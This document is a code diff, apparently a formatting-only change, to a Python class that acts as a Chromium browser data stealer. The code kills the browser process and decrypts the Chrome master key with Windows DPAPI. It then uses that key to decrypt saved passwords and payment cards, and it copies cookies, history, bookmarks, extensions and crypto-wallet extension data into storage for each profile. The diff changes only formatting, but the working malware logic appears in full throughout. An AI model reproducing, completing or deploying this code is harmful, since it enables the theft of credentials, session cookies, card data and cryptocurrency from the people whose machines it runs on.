@@ -17,8 +17,10 @@ class Chromium:
     """
     Collects data from the browser.
     """
-    def __init__(self, browser_name: str, browser_path: str, process_name: str, statuses: List):
 
+    def __init__(
+        self, browser_name: str, browser_path: str, process_name: str, statuses: List
+    ):
         self.__browser_name = browser_name
         self.__state_path = path.join(browser_path, "Local State")
         self.__browser_path = browser_path
@@ -43,7 +45,7 @@ class Chromium:
         run(
             f"taskkill /f /im {self.__process_name}",
             shell=True,
-            creationflags=CREATE_NEW_CONSOLE | SW_HIDE
+            creationflags=CREATE_NEW_CONSOLE | SW_HIDE,
         )
 
     def _get_profiles(self) -> List:
@@ -57,8 +59,12 @@ class Chromium:
         - list: List of all browser profiles.
         """
         pattern = compile(r"Default|Profile \d+")
-        profiles = sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])
-        profile_paths = [path.join(self.__browser_path, profile) for profile in profiles]
+        profiles = sum(
+            [pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], []
+        )
+        profile_paths = [
+            path.join(self.__browser_path, profile) for profile in profiles
+        ]
 
         if profile_paths:
             return profile_paths
@@ -79,7 +85,9 @@ class Chromium:
             self.__profiles = self._get_profiles()
 
     @staticmethod
-    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy: bytes = b'') -> bytes:
+    def _crypt_unprotect_data(
+        encrypted_bytes: b64decode, entropy: bytes = b""
+    ) -> bytes:
         """
         Decrypts data previously encrypted using Windows CryptProtectData function.
 
@@ -92,8 +100,20 @@ class Chromium:
         """
         blob = DataBlob()
 
-        if windll.crypt32.CryptUnprotectData(byref(DataBlob(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob)):
-
+        if windll.crypt32.CryptUnprotectData(
+            byref(
+                DataBlob(
+                    len(encrypted_bytes),
+                    c_buffer(encrypted_bytes, len(encrypted_bytes)),
+                )
+            ),
+            None,
+            byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
+            None,
+            None,
+            0x01,
+            byref(blob),
+        ):
             buffer = c_buffer(int(blob.cbData))
             cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
             windll.kernel32.LocalFree(blob.pbData)
@@ -115,7 +135,9 @@ class Chromium:
 
         state.close()
 
-        return self._crypt_unprotect_data(b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:])
+        return self._crypt_unprotect_data(
+            b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:]
+        )
 
     @staticmethod
     def _get_datetime(date: int) -> str:
@@ -146,7 +168,11 @@ class Chromium:
         - str: Decrypted string.
         """
         try:
-            return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
+            return (
+                AESModeOfOperationGCM(master_key, value[3:15])
+                .decrypt(value[15:])[:-16]
+                .decode()
+            )
         except:
             return "Can't decode"
 
@@ -165,7 +191,7 @@ class Chromium:
             f"file:{database}?mode=ro&immutable=1",
             uri=True,
             isolation_level=None,
-            check_same_thread=False
+            check_same_thread=False,
         )
         cursor = connection.cursor()
 
@@ -213,13 +239,15 @@ class Chromium:
 
         data = self.__config.PasswordsData
         temp = [
-            data.format(result[0], result[1], self._decrypt(result[2], self.__master_key))
+            data.format(
+                result[0], result[1], self._decrypt(result[2], self.__master_key)
+            )
             for result in passwords_list
         ]
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Passwords.txt"),
-            "".join(item for item in set(temp))
+            "".join(item for item in set(temp)),
         )
 
     def _grab_cookies(self, profile: str, file_path: str) -> None:
@@ -256,7 +284,7 @@ class Chromium:
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Cookies.txt"),
-            "\n".join(row for row in temp)
+            "\n".join(row for row in temp),
         )
 
     def _grab_cards(self, profile: str, file_path: str) -> None:
@@ -285,13 +313,18 @@ class Chromium:
 
         data = self.__config.CardsData
         temp = [
-            data.format(result[0], self._decrypt(result[3], self.__master_key), result[1], result[2])
+            data.format(
+                result[0],
+                self._decrypt(result[3], self.__master_key),
+                result[1],
+                result[2],
+            )
             for result in cards_list
         ]
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Cards.txt"),
-            "".join(item for item in set(temp))
+            "".join(item for item in set(temp)),
         )
 
     def _grab_history(self, profile: str, file_path: str) -> None:
@@ -311,7 +344,10 @@ class Chromium:
 
         cursor, connection = self._get_db_connection(file_path)
         results = cursor.execute(self.__config.HistorySQL).fetchall()
-        history_list = [cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results]
+        history_list = [
+            cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone()
+            for item in results
+        ]
 
         cursor.close()
         connection.close()
@@ -327,7 +363,7 @@ class Chromium:
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} History.txt"),
-            "".join(item for item in set(temp))
+            "".join(item for item in set(temp)),
         )
 
     def _grab_bookmarks(self, profile: str, file_path: str) -> None:
@@ -346,20 +382,19 @@ class Chromium:
             return
 
         file = self._get_file(file_path)
-        bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])
+        bookmarks_list = sum(
+            [self.__config.BookmarksRegex.findall(item) for item in file.split("{")], []
+        )
 
         if not bookmarks_list:
             return
 
         data = self.__config.BookmarksData
-        temp = [
-            data.format(result[0], result[1])
-            for result in bookmarks_list
-        ]
+        temp = [data.format(result[0], result[1]) for result in bookmarks_list]
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Bookmarks.txt"),
-            "".join(item for item in set(temp))
+            "".join(item for item in set(temp)),
         )
 
     def _grab_extensions(self, profile: str, extensions_path: str) -> None:
@@ -383,14 +418,15 @@ class Chromium:
             return
 
         for dirpath in extensions_dirs:
-
             extension_dir = listdir(path.join(extensions_path, dirpath))
 
             if len(extension_dir) == 0:
                 continue
 
             extension_dir = extension_dir[-1]
-            manifest_path = path.join(extensions_path, dirpath, extension_dir, "manifest.json")
+            manifest_path = path.join(
+                extensions_path, dirpath, extension_dir, "manifest.json"
+            )
 
             with open(manifest_path, "r", encoding="utf-8") as file:
                 manifest = load(file)
@@ -403,7 +439,7 @@ class Chromium:
 
         self.__storage.add_from_memory(
             path.join(self.__path, rf"{profile} Extensions.txt"),
-            "\n".join(item for item in set(extensions_list))
+            "\n".join(item for item in set(extensions_list)),
         )
 
     def _grab_wallets(self, profile: str, wallets: str) -> None:
@@ -422,9 +458,7 @@ class Chromium:
 
         for wallet in self.__config.WalletLogs:
             for extension in wallet["folders"]:
-
                 try:
-
                     extension_path = path.join(wallets, extension)
 
                     if not path.exists(extension_path):
@@ -432,7 +466,10 @@ class Chromium:
 
                     self.__storage.add_from_disk(
                         extension_path,
-                        path.join("Wallets", rf'{self.__browser_name} {profile} {wallet["name"]}')
+                        path.join(
+                            "Wallets",
+                            rf'{self.__browser_name} {profile} {wallet["name"]}',
+                        ),
                     )
 
                 except Exception as e:
@@ -453,44 +490,45 @@ class Chromium:
             {
                 "method": self._grab_passwords,
                 "arguments": [profile_name, path.join(profile, "Login Data")],
-                "status": True if Features.passwords in self.__statuses else False
+                "status": True if Features.passwords in self.__statuses else False,
             },
             {
                 "method": self._grab_cookies,
                 "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
-                "status": True if Features.cookies in self.__statuses else False
+                "status": True if Features.cookies in self.__statuses else False,
             },
             {
                 "method": self._grab_cards,
                 "arguments": [profile_name, path.join(profile, "Web Data")],
-                "status": True if Features.cards in self.__statuses else False
+                "status": True if Features.cards in self.__statuses else False,
             },
             {
                 "method": self._grab_history,
                 "arguments": [profile_name, path.join(profile, "History")],
-                "status": True if Features.history in self.__statuses else False
+                "status": True if Features.history in self.__statuses else False,
             },
             {
                 "method": self._grab_bookmarks,
                 "arguments": [profile_name, path.join(profile, "Bookmarks")],
-                "status": True if Features.bookmarks in self.__statuses else False
+                "status": True if Features.bookmarks in self.__statuses else False,
             },
             {
                 "method": self._grab_extensions,
                 "arguments": [profile_name, path.join(profile, "Extensions")],
-                "status": True if Features.bookmarks in self.__statuses else False
+                "status": True if Features.bookmarks in self.__statuses else False,
             },
             {
                 "method": self._grab_wallets,
-                "arguments": [profile_name, path.join(profile, "Local Extension Settings")],
-                "status": True if Features.wallets in self.__statuses else False
-            }
+                "arguments": [
+                    profile_name,
+                    path.join(profile, "Local Extension Settings"),
+                ],
+                "status": True if Features.wallets in self.__statuses else False,
+            },
         ]
 
         for function in functions:
-
             try:
-
                 if function["status"] is False:
                     continue
 
@@ -528,7 +566,6 @@ class Chromium:
         - None.
         """
         try:
-
             self._kill_process()
             self._check_paths()
             self._check_profiles()
